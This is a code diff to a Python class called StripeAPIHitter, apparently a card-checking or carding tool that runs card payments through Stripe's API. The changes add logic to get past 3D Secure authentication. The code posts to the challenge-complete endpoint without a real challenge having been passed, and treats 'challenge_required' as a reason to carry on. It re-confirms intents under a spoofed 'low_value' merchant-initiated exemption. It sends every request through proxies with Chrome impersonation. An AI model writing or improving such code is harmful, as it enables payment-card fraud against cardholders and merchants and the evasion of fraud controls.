@@ -1530,9 +1530,9 @@ class StripeAPIHitter:
                                         auth_headers["Stripe-Account"] = self.stripe_account
                                     
                                     auth_variations = [
-                                        {"threeDSCompInd": "Y", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "U", "fingerprintAttempted": True},
-                                        {"threeDSCompInd": "N", "fingerprintAttempted": False}
+                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "U", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "N", "threeDSRequestorChallengeInd": "03", "fingerprintAttempted": False}
                                     ]
                                     
                                     auth_json = {}
@@ -1543,6 +1543,7 @@ class StripeAPIHitter:
                                             "fingerprintData": None,
                                             "challengeWindowSize": "05",
                                             "threeDSCompInd": var["threeDSCompInd"],
+                                            "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
                                             "browserJavaEnabled": False,
                                             "browserJavascriptEnabled": True,
                                             "browserLanguage": "en-US",
@@ -1571,24 +1572,29 @@ class StripeAPIHitter:
                                             state = auth_json.get("state")
                                             if state in ["succeeded", "authenticated"]:
                                                 break
+                                                
                                             # Check if ACS challenge details provided
                                             ares = auth_json.get("ares", {}) or {}
                                             acs_url = ares.get("acsURL") or auth_json.get("acs_url")
                                             creq = ares.get("cReq") or auth_json.get("creq")
+                                            
+                                            # Always trigger challenge/complete notify if source present
+                                            comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
+                                            comp_data = {"source": source, "key": pk}
                                             if acs_url and creq:
                                                 try:
-                                                    # Execute ACS Challenge handshake
                                                     acs_headers = {"User-Agent": _auth_ua, "Content-Type": "application/x-www-form-urlencoded"}
-                                                    acs_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=20, impersonate="chrome120"))
-                                                    acs_body = acs_resp.text
-                                                    cres_m = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_body, re.I) or re.search(r'value=["\']([A-Za-z0-9+/=]{40,})["\']', acs_body)
-                                                    if cres_m:
-                                                        comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
-                                                        comp_data = {"source": source, "key": pk}
-                                                        await loop.run_in_executor(None, lambda: cffi_requests.post(comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=20, impersonate="chrome120"))
+                                                    await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate="chrome120"))
                                                 except Exception:
                                                     pass
+                                                    
+                                            try:
+                                                await loop.run_in_executor(None, lambda: cffi_requests.post(comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate="chrome120"))
+                                            except Exception:
+                                                pass
+                                                
+                                            if state in ["succeeded", "authenticated", "challenge_required"]:
                                                 break
                                         except Exception:
                                             continue
@@ -1610,12 +1616,52 @@ class StripeAPIHitter:
                                     }
                                     if self.stripe_account:
                                         poll_headers["Stripe-Account"] = self.stripe_account
-                                    poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
-                                        poll_url, headers=poll_headers, proxies=proxies,
-                                        timeout=30, impersonate="chrome120"))
-                                    poll_json = poll_resp_raw.json()
-                                    status_2 = poll_json.get('status')
+                                        
+                                    # Polling retry loop (up to 3 attempts with 1.5s delay)
+                                    status_2 = None
+                                    poll_json = {}
+                                    for poll_idx in range(3):
+                                        poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
+                                            poll_url, headers=poll_headers, proxies=proxies,
+                                            timeout=30, impersonate="chrome120"))
+                                        poll_json = poll_resp_raw.json()
+                                        status_2 = poll_json.get('status')
+                                        if status_2 in ['succeeded', 'requires_capture', 'complete']:
+                                            break
+                                        if status_2 not in ['requires_action', 'requires_source_action']:
+                                            break
+                                        await asyncio.sleep(1.5)
                                     
+                                    # Fallback Exemption Re-confirm if still requires_action
+                                    if status_2 in ['requires_action', 'requires_source_action'] and (is_pi or is_seti):
+                                        try:
+                                            fallback_confirm_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}/confirm"
+                                            fallback_data = {
+                                                "payment_method": pm_id,
+                                                "expected_payment_method_type": "card",
+                                                "payment_method_options[card][mit_exemption][reason]": "low_value",
+                                                "use_stripe_sdk": "false",
+                                                "key": pk,
+                                                "client_secret": client_secret
+                                            }
+                                            if self.stripe_account:
+                                                fallback_headers = headers.copy()
+                                            else:
+                                                fallback_headers = headers.copy()
+                                            import uuid as _uuid2
+                                            fallback_headers["Idempotency-Key"] = str(_uuid2.uuid4())
+                                            fb_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                fallback_confirm_url, headers=fallback_headers, data=fallback_data,
+                                                proxies=proxies, timeout=25, impersonate=profile["impersonate"]))
+                                            fb_json = fb_res.json()
+                                            fb_pi = fb_json.get('payment_intent') or fb_json.get('setup_intent') or fb_json
+                                            fb_status = fb_pi.get('status') if isinstance(fb_pi, dict) else None
+                                            if fb_status in ['succeeded', 'requires_capture', 'complete']:
+                                                poll_json = fb_json
+                                                status_2 = fb_status
+                                        except Exception:
+                                            pass
+
                                     if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
                                         receipt_url = find_receipt_url(poll_json)
